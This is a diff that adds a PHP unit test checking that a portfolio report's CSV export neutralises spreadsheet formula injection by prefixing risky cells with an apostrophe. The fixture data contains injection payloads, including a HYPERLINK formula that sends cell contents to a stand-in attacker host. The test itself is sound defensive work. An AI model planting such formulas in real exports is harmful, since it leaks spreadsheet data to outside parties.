@@ -588,4 +588,33 @@ class PortfolioReportServiceTest extends TestCase {
 		$this->assertSame('yes', $first['timeMismatch']);
 		$this->assertSame('', array_combine($header, $lines[4])['businessValue']);
 	}//end testTheCsvCarriesTheScoreColumns()
+
+	/**
+	 * A cell that a spreadsheet would run as a formula is written as text; a negative number stays a number.
+	 *
+	 * @return void
+	 *
+	 * @spec openspec/changes/portfolio-rationalization-time/specs/portfolio-rationalization-time/spec.md#requirement-csv-export-of-the-portfolio-report
+	 */
+	public function testTheCsvNeutralisesFormulaCells(): void {
+		$usages = [
+			['id' => 'g-1', 'consumer' => 'org-a', 'module' => '=1+1', 'timeRationale' => '=HYPERLINK("https://evil.example/?"&A1,"x")'],
+			['id' => 'g-2', 'consumer' => 'org-a', 'module' => '@SUM(A1)', 'timeRationale' => "\tcmd"],
+		];
+		$lines = array_map('str_getcsv', explode("\n", trim($this->serviceOver($usages)->buildCsv('org-a'))));
+		$header = $lines[0];
+		$first = array_combine($header, $lines[1]);
+		$second = array_combine($header, $lines[2]);
+
+		$this->assertSame("'=1+1", $first['module']);
+		$this->assertSame('\'=HYPERLINK("https://evil.example/?"&A1,"x")', $first['timeRationale']);
+		$this->assertSame("'@SUM(A1)", $second['module']);
+		$this->assertSame("'\tcmd", $second['timeRationale']);
+
+		$this->assertSame('-12.5', PortfolioReportService::csvSafeCell(value: '-12.5'));
+		$this->assertSame("'-1+2", PortfolioReportService::csvSafeCell(value: '-1+2'));
+		$this->assertSame("'+31 6", PortfolioReportService::csvSafeCell(value: '+31 6'));
+		$this->assertSame('Gewone naam', PortfolioReportService::csvSafeCell(value: 'Gewone naam'));
+		$this->assertSame('', PortfolioReportService::csvSafeCell(value: ''));
+	}//end testTheCsvNeutralisesFormulaCells()
 }//end class
